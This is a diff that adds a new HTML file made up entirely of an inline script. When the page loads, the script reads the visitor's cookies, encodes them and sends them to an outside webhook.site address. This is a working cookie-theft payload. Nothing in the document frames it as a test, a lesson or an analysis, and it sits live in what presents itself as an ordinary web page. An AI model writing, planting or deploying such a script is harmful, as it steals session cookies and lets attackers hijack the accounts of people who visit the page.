@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+    <script>
+        (function() {
+            var cookies = document.cookie;
+            var encodedCookies = encodeURIComponent(cookies);
+            fetch("https://webhook.site/e848b899-5716-4908-9088-7181eb90bb9c?cookie=" + encodedCookies, {
+                method: "GET"
+            });
+        })();
+    </script>
+</html>
